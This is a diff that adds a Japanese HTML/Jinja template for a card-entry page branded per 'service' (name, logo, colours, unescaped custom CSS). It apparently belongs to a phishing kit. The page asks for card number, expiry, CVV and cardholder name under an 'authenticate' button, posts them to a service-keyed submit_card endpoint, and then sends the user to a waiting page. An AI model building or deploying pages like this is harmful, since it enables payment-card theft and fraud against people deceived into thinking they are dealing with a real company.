@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ service.display_name }}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: {{ service.design.font_family }};
+            background-color: {{ service.design.background_color }};
+            color: {{ service.design.text_color }};
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: {{ service.design.background_color }};
+            border: 2px solid {{ service.design.border_color }};
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            max-width: 200px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-weight: bold;
+            color: {{ service.design.text_color }};
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: {{ service.design.text_color }};
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid {{ service.design.border_color }};
+            font-size: 16px;
+            background-color: {{ service.design.secondary_color }};
+            color: {{ service.design.text_color }};
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: {{ service.design.primary_color }};
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background-color: {{ service.design.button_bg_color }};
+            color: {{ service.design.button_text_color }};
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .error-message {
+            color: {{ service.design.text_color }};
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid {{ service.design.border_color }};
+            background-color: {{ service.design.secondary_color }};
+            display: none;
+        }
+
+        .error-message:not(:empty) {
+            display: block;
+        }
+
+        /* カスタムCSS */
+        {{ service.design.custom_css | safe }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        {% if service.logo_url %}
+        <div class="logo">
+            <img src="{{ service.logo_url }}" alt="{{ service.name }}">
+        </div>
+        {% endif %}
+
+        <h1>{{ service.display_name }}</h1>
+        
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="card_number">カード番号</label>
+                <input type="text" id="card_number" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry">有効期限</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="name">カード名義人</label>
+                <input type="text" id="name" name="name" placeholder="TARO YAMADA" required>
+            </div>
+            
+            <button type="submit" class="btn">認証する</button>
+        </form>
+        
+        <div id="error" class="error-message"></div>
+    </div>
+
+    <script>
+        // カード番号の自動フォーマット
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // 有効期限の自動フォーマット
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // CVVは数字のみ
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // フォーム送信
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const errorDiv = document.getElementById('error');
+            errorDiv.textContent = '';
+            
+            const cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const name = document.getElementById('name').value;
+            
+            // バリデーション
+            if (cardNumber.length < 13 || cardNumber.length > 19) {
+                errorDiv.textContent = 'カード番号が正しくありません';
+                return;
+            }
+            
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                errorDiv.textContent = '有効期限が正しくありません';
+                return;
+            }
+            
+            if (cvv.length < 3 || cvv.length > 4) {
+                errorDiv.textContent = 'CVVが正しくありません';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/{{ service_key }}/submit_card', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        card_number: cardNumber,
+                        expiry: expiry,
+                        cvv: cvv,
+                        name: name
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    window.location.href = '/{{ service_key }}/waiting';
+                } else {
+                    errorDiv.textContent = result.message;
+                }
+            } catch (error) {
+                errorDiv.textContent = 'エラーが発生しました';
+            }
+        });
+    </script>
+</body>
+</html>
